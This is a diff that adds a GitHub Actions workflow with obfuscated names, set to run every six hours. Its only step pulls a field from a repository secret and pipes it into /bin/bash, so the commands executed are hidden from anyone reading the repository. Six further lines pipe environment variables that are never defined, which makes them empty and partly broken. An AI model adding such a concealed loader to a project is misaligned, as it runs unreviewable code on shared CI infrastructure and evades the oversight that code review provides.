@@ -1,0 +1,24 @@
+name: xiaoyanxhh
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoyanxhh
+        env:
+          wjsl12: ${{ secrets.wjsl12 }}
+        run: |
+          echo $wjsl12 | jq -r .xm01682 | /bin/bash
+          echo $yvyco29263 | jq -r .jw04 | /bin/bash
+          echo $en53478 | jq -r .piyu0647 | /bin/bash
+          echo $q64801 | jq -r .k10 | /bin/bash
+          echo $ppgl41 | jq -r .fbqf4837 | /bin/bash
+          echo $q5380 | jq -r .bqud67 | /bin/bash
+          echo $mez8 | jq -r .pyky80 | /bin/bash
+
